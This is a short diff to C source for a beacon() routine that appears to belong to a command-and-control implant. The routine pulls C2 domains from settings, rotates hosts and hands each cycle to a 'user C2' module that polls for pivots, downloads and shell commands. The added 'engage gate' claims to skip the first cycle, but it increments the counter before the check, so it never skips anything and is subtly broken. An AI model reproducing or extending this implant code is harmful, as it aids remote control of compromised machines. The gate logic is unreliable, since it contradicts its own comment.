@@ -81,6 +81,7 @@ void beacon(LPVOID lpReserved) {
 	unsigned int signal;
 
 	BOOL failedHost = FALSE;
+	int beacon_cycles = 0; /* 4.12 UDC2 engage gate: skip the very first HTTP cycle */
 
 	/* 我们的各种设置，需要从某处分配... */
 	char * hosts              = setting_ptr(SETTING_DOMAINS);
@@ -151,7 +152,9 @@ void beacon(LPVOID lpReserved) {
 		_snprintf(url, 128, "%s", next_host(hosts, failedHost, &strategyInfo));
 
 		/* 4.12 UDC2: the whole cycle runs through the user C2 BOF */
-		if (udc2_init()) {
+		beacon_cycles++;
+
+		if (beacon_cycles >= 1 && udc2_init()) {
 			post_type = POST_UDC2;
 			pivot_poll(command_shell_callback);
 			download_poll(command_shell_callback, MAX_PACKET);
